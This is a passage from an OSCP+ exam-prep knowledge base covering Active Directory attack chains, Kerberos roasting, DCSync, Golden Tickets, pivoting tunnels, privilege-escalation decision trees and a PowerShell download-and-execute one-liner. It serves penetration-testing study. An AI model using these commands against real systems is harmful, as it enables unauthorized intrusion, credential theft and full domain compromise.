 → that user can DCSync (or is a Domain Admin) → secretsdump the domain
 → Pass-the-Hash the Administrator into the DC and members → read every proof.txt
```
**Priorities:** always do the two free roasts + BloodHound first; always spray every new cred on every host; let BloodHound pick the path; take the shortest edge you can run with your Kali tools.

## [KERBEROS-QUICK]  Kerberos cheat-strip
```bash
Clock:        sudo ntpdate $DC                                            # fix KRB_AP_ERR_SKEW FIRST
AS-REP:       GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC   → crack -m 18200
Kerberoast:   GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC                   → crack -m 13100
Hash→Ticket:  getTGT.py $DOMAIN/$U -hashes :$H ; export KRB5CCNAME=$U.ccache ; then use -k -no-pass
DCSync:       secretsdump.py $DOMAIN/$U:$P@$DC
Golden Ticket:ticketer.py -nthash <krbtgt hash> -domain-sid <domain SID> -domain $DOMAIN administrator
```

## [AD-TROUBLESHOOTING]
| What you see | Cause / fix |
|---|---|
| `KRB_AP_ERR_SKEW` | clock skew → `sudo ntpdate $DC` |
| `STATUS_LOGON_FAILURE` | wrong creds/domain → try `-d $DOMAIN` or `$DOMAIN/user`; check case |
| `STATUS_ACCOUNT_RESTRICTION` | that account can't log on to that host/protocol |
| `STATUS_PASSWORD_EXPIRED` | reset it via `smbpasswd`/`rpc password` if allowed |
| Kerberoast returns nothing | no SPN accounts, or you forgot `-request` + a valid cred |
| PtH fails on WinRM but SMB says Pwn3d | the account lacks WinRM rights → use psexec/wmiexec |
| BloodHound collection fails | clock skew, LDAP signing, or wrong `-ns` |
| `secretsdump` DCSync "denied" | your account lacks replication rights — wrong path |
| relay says "signing:True" | can't NTLM-relay to a host with SMB signing on → find a `signing:False` host |

## [COMMON-RABBIT-HOLES ad]
- Grinding a Kerberoast hash that won't crack instead of trying other users/edges.
- Ignoring BloodHound and hunting the path by hand.
- Forgetting to spray a newly found password on **all** hosts.
- Trying to locally-privesc a host when the real path is "these creds are admin on *another* host" or an ACL edge.
- Not fixing clock skew and blaming your credentials.

---

# [PIVOT]  PIVOTING — reaching networks only the victim can see

> **What is pivoting?** Some machines have two network cards: one facing you, one facing a hidden internal network you can't reach directly. Once you own such a "dual-homed" machine, you tunnel *through* it so your Kali tools can attack the hidden subnet. That machine is the "pivot".

## [PIVOT-QUICK]  the two tools you need  (one screen)
```
Picture:  YOUR KALI  →(tunnel)→  PIVOT HOST (owned, dual-homed)  →  HIDDEN SUBNET (e.g. 172.16.5.x)

LIGOLO-NG (cleanest — gives you a real network route; no proxychains needed):
  ./proxy -selfcert                              # on KALI: start the ligolo relay
  sudo ip route add 172.16.5.0/24 dev ligolo     # on KALI: route the hidden subnet through the tunnel
  ./agent -connect <IP>:11601 -ignore-cert       # on the PIVOT host: connect back to your relay
  # in the ligolo console: session → start. Now run nmap/nxc against 172.16.5.x NATIVELY.

CHISEL (creates a SOCKS proxy you run tools through with proxychains):
  ./chisel server -p 8000 --reverse              # on KALI
  ./chisel client <IP>:8000 R:socks              # on the PIVOT host
  proxychains nxc smb 172.16.5.0/24              # prefix any tool with 'proxychains' to send it through the tunnel

SSH (if you have SSH creds on the pivot):
  ssh -D 1080 user@pivot                          # a SOCKS proxy → use with proxychains
  ssh -L 9000:172.16.5.10:445 user@pivot          # forward ONE internal host:port to your localhost:9000
```
**Rule:** through a SOCKS proxy, use **TCP-connect** scans only: `proxychains nmap -sT -Pn -n 172.16.5.10`. No UDP or ping over SOCKS.

## [PIVOT-SSH]  SSH port forwarding (get the direction right)
- **Local (`-L`):** opens a port **on your Kali** that tunnels to an internal `host:port` through the pivot. Use when *you* start the connection. `ssh -L 8080:internal-web:80 user@pivot` → browse `localhost:8080`.
- **Remote (`-R`):** opens a port **on the far side** that tunnels back to something *you* can reach. Use to expose your Kali listener to a segmented box.
- **Dynamic (`-D`):** a SOCKS proxy on Kali → run anything through proxychains. Best general option if you have SSH.
- Handy flags: `-N` (no shell), `-f` (background).

## [PIVOT-CHISEL]  details
- Reverse SOCKS (the pivot can't accept inbound but can reach you): `--reverse` server on Kali, `R:socks` client on the pivot. proxychains uses `socks5 127.0.0.1 1080`.
- Single port forward: `R:9000:172.16.5.10:3389` → RDP to `localhost:9000`.
- Transfer chisel to the pivot (`[FILETRANSFER-QUICK]`); match the architecture (linux/windows, x64).

## [PIVOT-LIGOLO]  details (preferred)
- Gives you a routed interface, so you run `nmap`/`nxc`/`evil-winrm` **natively** against the internal subnet (faster, and UDP works).
- Kali setup: `sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert`.
- Add a route for the hidden subnet to `dev ligolo`, then start the agent's session.
- To catch reverse shells from internal hosts, use ligolo's listener feature to expose your Kali listener to them.

## [PIVOT-ENUM]  what to do after you pivot
1. Find live hosts: `proxychains nxc smb 172.16.5.0/24` (or native with ligolo).
2. Port-scan them (TCP connect): `proxychains nmap -sT -Pn -n -p 445,3389,5985,88 172.16.5.10`.
3. Spray your creds/hashes across the new subnet; if it's AD, re-run BloodHound from the new perspective.

## [PIVOT-TROUBLESHOOTING]
| What you see | Cause / fix |
|---|---|
| proxychains "connection refused" | SOCKS not up / wrong port in `proxychains4.conf` (`socks5 127.0.0.1 1080`) |
| nmap through proxychains hangs | you used SYN/UDP → must be `-sT -Pn -n`; scan few ports |
| DNS fails through the proxy | use IPs, or add hosts to `/etc/hosts` |
| chisel client won't connect | pivot egress blocked → use port 80/443; confirm server `--reverse` |
| ligolo: no traffic | you forgot `ip route add <subnet> dev ligolo`, or didn't start the session |
| reverse shell from internal host never arrives | your listener isn't reachable → expose Kali via ligolo listener / chisel `R:` |
| binary won't run | wrong architecture — get linux-amd64 / windows-amd64 |

## [COMMON-RABBIT-HOLES pivot]
- SYN/UDP scanning over SOCKS (doesn't work). Scanning huge port ranges through a proxy (glacially slow — target specific ports). Forgetting the ligolo route. Wrong tunnel direction (`-L` vs `-R`). Not re-spraying creds on the new subnet.

---
*End Volume 5. Next: Volume 6 — quick lookups, troubleshooting, the tool encyclopedia, and the exam report.*


# OSCP+ KNOWLEDGE BASE — VOLUME 6
## "I FOUND X, WHAT NOW?" · STUCK PROTOCOL · TROUBLESHOOTING · ATTACK CHAINS · TECH ENCYCLOPEDIA · TOOLBOX · MACHINE JOURNAL · FINAL DELIVERABLES

---

# [FOUND-*]  "I FOUND X, WHAT NOW?"  (do-this-first → then → if-fails → change hypothesis)

### [FOUND-CREDS] I found credentials
1. **Spray everywhere:** `nxc smb/winrm/ldap/mssql/rdp <hosts> -u U -p P` + `ssh`/`evil-winrm` + web logins. Try `--local-auth` and domain form.
2. Try the same user with password **variations**; try the password with **other users**.
3. If domain → **BloodHound as this user** + Kerberoast/AS-REP.
4. IF FAILS: maybe it's a hash not a password; maybe it unlocks a *file* (KeePass/zip) → crack. → change hypothesis: creds may be for a specific app, not the OS.

### [FOUND-SSHKEY] I found a private SSH key
1. `chmod 600 key; ssh -i key user@host` (guess user from filename/context/`authorized_keys`).
2. Encrypted? `ssh2john key > h; john --wordlist=rockyou.txt h`.
3. Try the key against **other** hosts/users (reuse).
4. IF FAILS: wrong user — check `/etc/passwd`, home dirs, `authorized_keys` comment field for the username.

### [FOUND-SUID] I found an unusual SUID binary
1. GTFOBins the name (SUID section).
2. Custom binary → `strings`/`ltrace ./bin` → relative-path call (PATH hijack) or command exec.
3. `pkexec` present → PwnKit.
4. IF FAILS: it drops privs internally / no exploitable call → move to sudo/cron/caps.

### [FOUND-SUDO] `sudo -l` shows something
1. GTFOBins the allowed binary (Sudo section).
2. Editable script as root → inject payload. `env_keep LD_PRELOAD` → `.so` hijack.
3. Version-specific: CVE-2021-3156 / CVE-2019-14287.
4. IF FAILS: binary with no escape + no writable input → different vector.

### [FOUND-SMB] I found SMB
1. `nxc smb $IP -u '' -p '' --shares --users`; `smbclient -N -L //$IP/`; `enum4linux-ng -A $IP`.
2. Read every readable share (GPP/`unattend.xml`/scripts/backups/`.kdbx`).
3. Have creds → spray + `--rid-brute`; Pwn3d! → psexec/wmiexec.
4. Domain name shown → pivot to **AD** (`[AD-QUICK]`). IF FAILS: null disabled → need creds first.

### [FOUND-WRITABLE-SERVICE] I found a writable service / unquoted path (Windows)
1. Confirm write to binary/segment (`accesschk`/PowerUp).
2. Replace/plant payload → `sc stop/start` (or wait for reboot/auto-restart).
3. IF FAILS: can't restart → find another service, or reboot-persistence, or different vector.

### [FOUND-PW-CONFIG] I found a password in a config file
1. Identify what it's for (DB? app? SSH? domain?). Try it on that service AND everywhere (reuse).
2. DB cred → log into DB → dump app users/hashes → next creds.
3. IF FAILS: could be old/rotated → try variations; look for more configs/backups.

### [FOUND-GIT] I found a .git repo
1. `git-dumper http://$IP/.git ./loot` (or already local: `cd repo`).
2. `git log -p | grep -iE 'pass|secret|key|token'`; `git show <deleted>`; `git stash list`.
3. Read source → find vulns/endpoints/creds.
4. IF FAILS: check branches/tags, `.git/config` for remotes/creds.

### [FOUND-BACKUP] I found a backup (.bak/.zip/.old)
1. Download + extract; encrypted zip → `zip2john`.
2. Read for creds/source/DB dumps; source of a running app → find its vuln.
3. IF FAILS: check for more backups; different extension guesses in dir brute.

### [FOUND-SQLI] I found SQL injection
→ `[SQLI-DECISION-TREE]`: identify DB → union/blind → dump creds → (MSSQL `xp_cmdshell`/Postgres `COPY`/MySQL `FILE`) RCE. IF FAILS: dump creds and pivot to a login instead of chasing RCE.

### [FOUND-LFI] I found LFI
→ `[WEB-LFI]`: `/etc/passwd` confirm → `php://filter` read source (creds) → log poisoning / wrapper RCE. IF FAILS: use it purely to read config/keys → SSH/login.

### [FOUND-CMDINJ] I found command injection
→ `[WEB-CMDINJ]`: confirm with `;id`/`sleep`, then reverse shell (URL-encoded). IF FAILS: blind → exfil via HTTP/DNS; filtered → `${IFS}`/base64.

### [FOUND-DOMAINUSER] I found a valid domain user
→ `[AD-QUICK]`/`[THINK-DOMAINUSER]`: BloodHound + Kerberoast + AS-REP + spray → follow shortest path.

### [FOUND-SPN] I found an SPN (Kerberoastable)
→ `[AD-KERBEROAST]`: `GetUserSPNs -request` → hashcat 13100 → reuse pw + check that account's rights.

### [FOUND-ASREP] I found an AS-REP-roastable user
→ `[AD-ASREP]`: `GetNPUsers` → hashcat 18200 → reuse.

### [FOUND-HASH] I found a hash
→ `[HASH-IDENTIFICATION]`: identify type. If NTLM → **PtH first** (`nxc -H`), then crack. Else pick the right hashcat mode.

### [FOUND-LINSHELL] I got a Linux shell
1. Stabilize TTY. 2. `id; sudo -l; find / -perm -4000 2>/dev/null`. 3. linpeas. 4. Loot creds + note internal subnets (pivot). → `[LINUX-PRIVESC-QUICK]`.

### [FOUND-WINSHELL] I got a Windows shell
1. `whoami /all`. 2. `whoami /priv` (SeImpersonate → Potato). 3. winpeas + service/registry checks. 4. Loot creds → lateral. → `[WINDOWS-PRIVESC-QUICK]`.

### [FOUND-WINRM] I found WinRM (5985)
Have creds? `nxc winrm` → Pwn3d! → `evil-winrm -i $IP -u U -p P` (or `-H hash`). No creds → get them first (roast/spray/loot).

### [FOUND-RDP] I found RDP (3389)
Validate `nxc rdp`; connect `xfreerdp /v:$IP /u:U /p:P +clipboard`. Use for GUI privesc/transfer. PtH needs Restricted Admin.

### [FOUND-BH-GENERICALL] BloodHound shows I have GenericAll
→ `[AD-ACL]`: on user → force-change pw / shadow creds; on group → add self; on computer → RBCD/shadow; on domain → DCSync.

### [FOUND-ACL] I found an ACL edge
→ `[AD-ACL]` table: map edge → recipe (WriteDACL→grant GenericAll; WriteOwner→own→DACL; AddKeyCredentialLink→shadow creds; etc.).

### [FOUND-PIVOT] I found a pivot host (dual-homed)
→ `[PIVOT-QUICK]`: Ligolo/Chisel → route/proxychains → enumerate new subnet → spray creds there.

---

# [STUCK-PROTOCOL]  (been stuck 15–30 min)

**Run this exact sequence — it prevents re-trying the same failed attack.**
```
1. STOP & RE-READ your notes/scans. Answer: what have I NOT tried yet? (list untried surfaces)
2. RE-ENUMERATE: full -p- TCP again + top UDP. New port? Re-run -sCV. (Services can start; you may have missed one.)
3. RE-MAP WEB: every port, recursive dir brute + vhosts + params you skipped. Read source/JS again.
4. CHECK ASSUMPTIONS: is the version/OS/DB what I think? Verify manually, not via one tool's guess.
5. CREDENTIALS: have I sprayed EVERY cred on EVERY service/user/host? Variations? Reuse?
6. DIFFERENT PROTOCOL/SERVICE: attack a service I dismissed (SNMP/UDP/RPC/LDAP/NFS/redis).
7. VERSION RESEARCH: searchsploit + web for exact versions I found; read the CVE technique, try manually.
8. LOCAL (if I have a shell): re-run linpeas/winpeas, `sudo -l`, `whoami /priv`, loot again; new user = new surface.
9. AD: re-check roasts, BloodHound "from owned", un-sprayed hosts, ACL edges I skipped.
10. PIVOT: did I verify the tunnel actually works? re-scan the internal subnet.
11. REVERT the box (service may be crashed / prior-tester state).
12. SWITCH TARGET: write exactly where I stopped, go work another machine, return with fresh eyes.
```
**Meta-checks:** Am I retrying variants of one hypothesis (rabbit hole)? Am I editing an exploit I don't understand? Did I skip enumeration to jump to exploitation? The answer is almost always **something un-enumerated**, not a harder exploit.

# [COMMON-RABBIT-HOLES]  hub (per-area traps — jump to yours)
Each area has its own trap list; open the one for what you're doing:
- Enumeration/nmap → search **`[COMMON-RABBIT-HOLES nmap]`** (Vol ④): `--script vuln` false positives, chasing "filtered" ports, full UDP `-p-`.
- Web → **`[COMMON-RABBIT-HOLES web]`** (Vol ⑤): endless dir-brute, XSS with no victim, deserialization/XXE without source.
- SQLi → uncrackable/over-fuzzed single param (see `[SQLI-TROUBLESHOOTING]`).
- Linux privesc → **`[COMMON-RABBIT-HOLES linux-privesc]`** (Vol ⑦): kernel exploits first, chasing every SUID, cracking a hash you don't need.
- Windows privesc → **`[COMMON-RABBIT-HOLES windows-privesc]`** (Vol ⑦): jumping to kernel before `whoami /priv`, unquoted path with no writable segment.
- AD → **`[COMMON-RABBIT-HOLES ad]`** (Vol ⑧): grinding an uncrackable roast, ignoring BloodHound, forgetting to spray a new cred, exotic delegation when a simple ACL edge exists.
- Pivoting → **`[COMMON-RABBIT-HOLES pivot]`** (Vol ⑧): UDP/SYN over SOCKS, huge port ranges through a proxy, wrong tunnel direction.
> **Universal tell:** if it needs a 0-day or a miracle, you're in a hole — the intended path is simpler and you missed enumeration (`[STUCK-PROTOCOL]`).

---

# [TROUBLESHOOTING-QUICK] + [TROUBLESHOOTING-DB]  (SYMPTOM → CAUSES → CHECKS → FIX → IF STILL BROKEN)

### Reverse shell doesn't connect  → full version `[REVERSE-SHELL-NOT-CONNECTING]`
CAUSES: wrong LHOST (used eth0 not tun0), listener down, egress blocked, encoding/quoting, AV.
CHECKS: `ip a show tun0`; listener live; try ports 443/80/8080; `tcpdump -i tun0 port 443`.
FIX: correct LHOST, common port, base64/URL-encode, try sh/python/nc, use bind shell or webshell. IF STILL: pivot to expose your listener.

### HTTP works in browser but curl fails
CAUSES: needs `Host:` header (vhost), cookie/session, User-Agent filter, TLS/redirect.
CHECKS: `curl -v`; compare headers; add `-H "Host: name"`, `-b cookie`, `-A ua`, `-L`, `-k`.
FIX: replicate the browser request (copy as curl from Burp/DevTools).

### Exploit crashes / errors
CAUSES: Python2 vs 3, wrong version/arch/target index, missing deps, hardcoded IP.
CHECKS: read the code; `python2 exploit.py`; check offsets/targets; deps.
FIX: adjust LHOST/LPORT/target/paths; convert py2→py3; install deps. IF STILL: find alternate PoC or do the technique manually.

### Exploit works locally but not remotely
CAUSES: firewall/egress, different arch/patch level, path assumptions, timing/race.
FIX: check egress, match target build, adjust paths, add sleeps/retries.

### Python version mismatch
`print x` → py2. Run with `python2`, or fix syntax (`print()`, `.encode()`, `urllib`).

### SMB authentication failure
CAUSES: wrong domain/format, null disabled, SMBv1 only, signing.
CHECKS: `-d DOMAIN` / `DOMAIN/user`; `--local-auth`; `client min protocol=NT1`.
FIX: correct account type; PtH `-H`; different exec method.

### Kerberos errors
`KRB_AP_ERR_SKEW` → `sudo ntpdate $DC`. `KDC_ERR_PREAUTH` → wrong pw / need pre-auth. `KDC_ERR_S_PRINCIPAL_UNKNOWN` → wrong SPN/host (use hostname not IP, add to `/etc/hosts`). Use FQDN + `-k`.

### BloodHound problems
Collection fails → clock skew, wrong `-ns`/`-d`, LDAP signing → try `-c DCOnly`. Import fails → collector/GUI version mismatch.

### WinRM authentication problems
`nxc winrm` ok but `evil-winrm` fails → user not in Remote Management Users; TLS on 5986 (`-S`); clock skew (Kerberos) → use `-u/-p` NTLM.

### SSH problems
"Permission denied (publickey)" → wrong user/key. Old cipher → `-oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa`. Key perms → `chmod 600`.

### TTY problems
Ctrl-C kills shell / no arrows → do the full `[SHELL-STABILIZE]` (python pty + `stty raw -echo; fg` + `export TERM=xterm` + `stty rows/cols`).

### File transfer failure
→ `[FILETRANSFER-TROUBLESHOOTING]`: certutil blocked → curl.exe/bitsadmin/SMB; binary corrupt → `binary` mode; no egress → serve from target / base64.

### PowerShell problems
AMSI/ExecutionPolicy blocks script → `powershell -ep bypass`; base64 `-enc`; download-and-exec in memory `IEX(New-Object Net.WebClient).DownloadString('http://IP/x')`; AV kills it → obfuscate / use `.NET`/nc.exe.

### Hash cracking failure
CAUSES: wrong mode, malformed hash, pw not in wordlist.
CHECKS: `hashid`; verify hash format (no username unless mode expects it); try rules (`best64`, `OneRule`) + bigger lists.
FIX: right `-m`; `--username` to strip; targeted wordlist (company words). IF STILL: pw too strong → different vector.

### Chisel problems
Client won't connect → egress/port (use 443), server `--reverse`, arch mismatch. No traffic → proxychains `socks5 127.0.0.1 1080`, use `-sT -Pn`.

### Ligolo problems
No traffic → `ip route add <subnet> dev ligolo` missing; session not started; agent cert (`-ignore-cert`). Reverse shell from internal won't arrive → add ligolo listener to expose Kali.

### Proxychains problems
Refused → SOCKS down/wrong port. Hang → SYN/UDP over SOCKS (use `-sT -Pn -n`). DNS → use IPs / `proxy_dns`.

### DNS problems
Name won't resolve → add to `/etc/hosts` (`$IP name.domain`). Zone transfer refused → try each NS, or brute subdomains.

### Vhost problems
Same page for every Host → filter baseline with ffuf `-fs <size>` / `-fw <words>`; add real vhost to `/etc/hosts`; some apps need exact case/scheme.

### Nmap filtered ports
Firewall/ICMP → `-Pn`, lower `--min-rate`, `-sT` through proxy; a single "filtered" port is usually not worth an hour.

### Privilege escalation exploit fails
CAUSES: wrong kernel/build, compiled on wrong libc/arch, needs specific conditions.
CHECKS: exact `uname`/`systeminfo` match; compile on target-matching env; read prerequisites.
FIX: pick the right exploit/build; try the intended non-kernel vector first (kernel is last resort). IF STILL: re-enumerate — you likely missed an easier vector.

---

# [CHAIN-*] ATTACK CHAINS (with the reasoning between stages)

### [CHAIN-WEB-SSH] Web → creds → SSH → Linux privesc
Web app leaks creds (config/LFI-read-source/DB dump) → **reason:** users reuse passwords → SSH in as that user → `sudo -l`/SUID → root. *Connective logic:* the web box and the OS user share a secret.

### [CHAIN-SMB-WINRM] SMB → creds → WinRM → Windows privesc
Null/guest SMB share holds `unattend.xml`/GPP cpassword → decrypt → **reason:** valid domain/local cred → `nxc winrm` Pwn3d! → evil-winrm → `whoami /priv` SeImpersonate → Potato → SYSTEM.

### [CHAIN-LFI-CONFIG-SSH] Web → LFI → config → creds → SSH
`?page=` LFI → `php://filter` reads `config.php` → DB/user creds → **reason:** reuse → SSH → privesc. *Logic:* LFI's value is often file-read, not RCE.

### [CHAIN-SQLI-FOOTHOLD] SQLi → DB creds → service auth → foothold
SQLi dumps `users` table → crack/reuse a hash → **reason:** admin panel or SSH/SMB uses same cred → login → foothold. Or MSSQL SQLi → `xp_cmdshell` → shell directly.

### [CHAIN-AD-KERBEROAST] Domain user → Kerberoast → crack → lateral → ACL → DA
Assumed-breach user → `GetUserSPNs` → crack service acct → **reason:** service acct is local admin on a host → secretsdump → BloodHound "from owned" shows `WriteDACL` to a DA-group member → grant GenericAll → shadow creds → that user has DCSync → `secretsdump` domain → PtH Administrator → own DC + members.

### [CHAIN-ASREP-SPRAY] User list → AS-REP → crack → spray → foothold
No creds, just usernames → AS-REP roast a pre-auth-disabled user → crack → **reason:** spray reveals it's admin somewhere → evil-winrm → privesc.

### [CHAIN-PIVOT-INTERNAL] Foothold → pivot → internal AD
Root a DMZ host → discover `172.16.x` → **reason:** internal subnet has the DC → Ligolo route → BloodHound over the tunnel → standard AD chain to DA.

### [CHAIN-SNMP-CREDS] SNMP → process args → creds → login
`snmpwalk` shows a process run with `-p Password123` in args → **reason:** that's a live service cred → login to the service/OS. *Logic:* UDP enum you almost skipped held the key.

---

# [TECH-*] TECHNOLOGY ENCYCLOPEDIA
*(WHAT / HOW / WHY OSCP CARES / ENUMERATE / MISCONFIGS / ATTACKS / KEY CMDS / INTERESTING / TROUBLESHOOT / LEADS TO / RELATED)*

### [TECH-HTTP]/[TECH-HTTPS]
WHAT: request/response web protocol; HTTPS = HTTP over TLS. WHY: #1 foothold surface. ENUM: `[WEB-*]`. MISCONFIG: dir listing, backups, verbose errors, default creds, exposed `.git`/`.env`. ATTACKS: all web vulns. INTERESTING: Server/X-Powered-By headers, cert SAN (vhosts), redirects. LEADS TO: RCE/creds. RELATED: PHP, Apache, Nginx, IIS.

### [TECH-DNS]
WHAT: name↔IP + service records. WHY: zone transfer dumps internal names; AD SRV records reveal DCs. ENUM: `dig axfr`, `dnsrecon`, SRV lookups. MISCONFIG: AXFR to anyone. LEADS TO: vhosts, DC discovery. RELATED: AD, vhosts.

### [TECH-SMB]
WHAT: Windows file/print sharing + IPC over 445. WHY: enum, cred validation, lateral movement, loot. ENUM: `[SMB-ENUM]`. MISCONFIG: null/guest, writable shares, signing off, GPP cpassword. ATTACKS: RID brute, PtH, psexec/wmiexec, relay, EternalBlue (old). LEADS TO: creds, shells, AD. RELATED: RPC, LDAP, Kerberos, NTLM.

### [TECH-LDAP]
WHAT: directory access protocol = AD database over the wire. WHY: dump users/computers/ACLs; creds in `description`. ENUM: `ldapsearch`, `ldapdomaindump`, `nxc ldap`. MISCONFIG: anonymous bind, secrets in attributes. LEADS TO: full AD map, roast lists. RELATED: Kerberos, AD, BloodHound.

### [TECH-KERBEROS]
WHAT: ticket-based AD auth (AS-REQ/TGT/TGS). WHY: Kerberoast/AS-REP without admin; PtT/Golden. ENUM: `[ENUM-KERBEROS]`. MISCONFIG: pre-auth disabled, weak service-account passwords, delegation. ATTACKS: Kerberoast, AS-REP, PtT, S4U, Golden/Silver. INTERESTING: SPNs, `DONT_REQ_PREAUTH`, delegation flags. TROUBLESHOOT: clock skew, FQDN/SPN naming. RELATED: LDAP, NTLM, AD.

### [TECH-NTLM]
WHAT: challenge/response auth + the NT hash. WHY: PtH, relay, cracking NetNTLMv2. ENUM: capture via Responder; `secretsdump`. MISCONFIG: signing off (relay), NTLMv1. ATTACKS: PtH, relay, offline crack (`-m 5600`). RELATED: SMB, Kerberos.

### [TECH-SSH]
WHAT: encrypted remote shell/tunnel. WHY: payoff foothold + pivoting. ENUM: banner, key auth. MISCONFIG: password auth + weak pw, reused/world-readable keys. ATTACKS: key reuse, tunneling (`-L/-R/-D`). RELATED: pivoting, Linux.

### [TECH-FTP]/[TECH-RDP]/[TECH-WINRM]/[TECH-NFS]/[TECH-SNMP]
See `[ENUM-FTP]`, `[ENUM-RDP]`, `[ENUM-WINRM]`, `[ENUM-NFS]`, `[ENUM-SNMP]` — each covers what/why/enum/attacks/leads-to.

### [TECH-SQL]
WHAT: relational DBs (MySQL/MSSQL/Postgres/SQLite). WHY: SQLi → data/creds/RCE; direct login → RCE. ENUM/ATTACK: `[SQLI-*]`, `[ENUM-MSSQL]` `[ENUM-MYSQL]` `[ENUM-POSTGRES]`. MSSQL `xp_cmdshell`, Postgres `COPY PROGRAM`, MySQL `FILE`. LEADS TO: creds, RCE.

### [TECH-JWT]
WHAT: signed token (header.payload.signature). WHY: forge identity. ATTACKS: `alg:none`, weak-secret crack (`-m 16500`), RS/HS confusion, `kid`/`jku`. RELATED: web auth.

### [TECH-PHP]/[TECH-APACHE]/[TECH-NGINX]/[TECH-IIS]
PHP: wrappers (`php://filter`, `data://`), LFI→RCE, weak type juggling (`==`), `phpinfo` leaks. Apache: `.htaccess`, mod_cgi (Shellshock), 2.4.49/.50 traversal. Nginx: alias traversal, misrouted `/`, off-by-slash. IIS: `.aspx`/`web.config` upload, app-pool identity (SeImpersonate), short-name (8.3) enum, WebDAV. LEADS TO: RCE/creds.

### [TECH-AD]
WHAT: Windows domain directory (users/computers/policies/trusts). WHY: **the 40-point exam set.** ENUM/ATTACK: all `[AD-*]`. Mental model: creds → what they unlock (BloodHound) → move up → DCSync. RELATED: LDAP/Kerberos/NTLM/SMB.

### [TECH-POWERSHELL]
WHAT: Windows shell/scripting. WHY: enum + exec + download. KEY: `-ep bypass`, `-enc`, `IEX(New-Object Net.WebClient).DownloadString(...)`, `Get-History`/PSReadline. WATCH: AMSI/logging. RELATED: Windows privesc, evil-winrm.

### [TECH-LINUXPERMS]
WHAT: uid/gid, rwx, SUID/SGID/sticky, capabilities, sudoers. WHY: privesc lives here. KEY: `find -perm -4000`, `getcap`, `sudo -l`, `/etc/passwd|shadow|sudoers`. RELATED: `[LINUX-PRIVESC]`.

### [TECH-TOKENS]
WHAT: Windows access tokens + privileges (SeImpersonate, SeBackup, SeDebug, etc.). WHY: privilege abuse → SYSTEM. KEY: `whoami /priv`, Potato attacks. RELATED: `[WINDOWS-TOKENS]`.

---

# [TOOL-*] TOOLBOX  (PURPOSE / QUICK / KEY FLAGS / OUTPUT / MISTAKES / WHEN / WHEN NOT)

- **nmap** — port/service scan. `-p- --min-rate 2000`, `-sCV`, `-sU --top-ports`. Mistake: top-1000 only; trusting `-sV` guess. When not: through SOCKS (use `-sT`).
- **rustscan** — fast port discovery → pipe to nmap. `-a IP -- -sCV`. When not: if nmap two-step is fine.
- **ffuf / feroxbuster / gobuster** — content/vhost/param fuzzing. ffuf `-u .../FUZZ -w list -fs N`; ferox recursive by default. Mistake: no `-fs` baseline for vhosts; giant wordlists. 
- **nikto** — quick web misconfig sweep. Noisy; leads not proof.
- **whatweb / wafw00f** — stack + WAF fingerprint.
- **burp (community)** — intercept/repeat/decode; save requests for sqlmap `-r`. No active scanner in community.
- **curl / wget** — request/transfer. `curl -v/-k/-L/-H/-b/-A`; `wget -r ftp://`.
- **nc / socat** — listeners/shells/transfer. `nc -lvnp 443`; socat full TTY.
- **impacket** — `psexec/wmiexec/smbexec/secretsdump/GetUserSPNs/GetNPUsers/mssqlclient/getTGT/getST/ntlmrelayx/lookupsid`. The AD swiss-army knife.
- **netexec (nxc) / crackmapexec** — spray + enum + PtH across smb/winrm/ldap/mssql/rdp/ssh. `-u -p -H --shares --users --rid-brute --continue-on-success --local-auth`. Mistake: spraying past lockout.
- **enum4linux-ng** — one-shot SMB/RPC/LDAP enum. `-A $IP`.
- **smbclient / rpcclient / ldapsearch** — manual SMB/RPC/LDAP.
- **bloodhound / bloodhound-python / SharpHound** — AD graph. `-c all`. Mistake: not marking Owned; version mismatch.
- **evil-winrm** — Windows shell over WinRM. `-i -u -p` / `-H`; `upload/download`; `-s scripts`.
- **linpeas / winpeas / pspy / seatbelt / powerup** — local enum. Read RED; verify manually; pspy catches crons.
- **searchsploit** — offline Exploit-DB. `-m` copy, `-x` view, `-u` update. Read before running.
- **msfconsole / msfvenom** — **exam: one target only.** msfvenom for payloads (`-p ... -f exe/msi/aspx LHOST LPORT`). 
- **hashcat / john** — crack. hashcat `-m` mode + rules; john auto-detect. `ssh2john/zip2john/keepass2john`.
- **chisel / ligolo-ng / proxychains / ssh** — pivoting (`[PIVOT-*]`).
- **certipy / bloodyAD / pywhisker / kerbrute** — modern AD abuse (ADCS, ACL edits, shadow creds, user enum).

---

# [KALI-TOOLBOX]  🧰 every exam-usable Kali tool, by phase (+ allowed/banned)

> Kali ships **thousands** of tools; you need **~40**. This is the exam-usable set grouped by *when you use it*, each with a one-line purpose. **Legend:** ✅ allowed freely · 1️⃣ Metasploit **one-target-only** · ⚠️ allowed **with a caveat** · ⛔ **BANNED** (see `[EXAM-RULES-2026]`). Verify against the current official guide.
> See installed tools: `apt list --installed 2>/dev/null | grep <name>`, browse `/usr/share/`, or the Kali menu categories.
> 👉 To **install/download** these (apt + `~/tools` folder for winpeas/potatoes/chisel/ligolo), see **`[KALI-SETUP]`**. This section = *understand & use*; that one = *install*.

## 1) Port scanning & host discovery
```
✅ nmap        the one you live in — ports/services/versions/NSE scripts  [NMAP-QUICK]
✅ rustscan    ultra-fast port find → pipes into nmap
✅ masscan     very fast sweep (always re-verify hits with nmap -sCV)
✅ arp-scan / netdiscover / fping   host discovery on an internal subnet (post-pivot)
⛔ Nessus / OpenVAS / Nexpose       automated vuln scanners — BANNED
```

## 2) Web — recon & content discovery
```
✅ whatweb / wafw00f     tech stack + WAF fingerprint
✅ feroxbuster / ffuf / gobuster / dirb / dirsearch   directory & file brute
✅ ffuf / gobuster vhost + arjun / wfuzz              vhost & hidden-parameter discovery
✅ wpscan / joomscan / droopescan                     CMS-specific scanners
✅ nikto                 quick misconfig/known-file sweep (leads, not proof)
✅ curl / wget           manual requests, transfer, header/cookie testing
```

## 3) Web — proxy & manual exploitation
```
✅ Burp Suite COMMUNITY   intercept/repeat/decoder/comparer (no active scanner)   ⛔ Burp PRO banned
✅ OWASP ZAP              alt proxy
✅ manual SQLi/LFI/RCE    do it by hand — [WEB-*] [SQLI-*]
⛔ sqlmap / sqlninja / db_autopwn / browser_autopwn   auto-exploitation — BANNED, do SQLi MANUALLY
```

## 4) SMB / RPC / LDAP / service enumeration
```
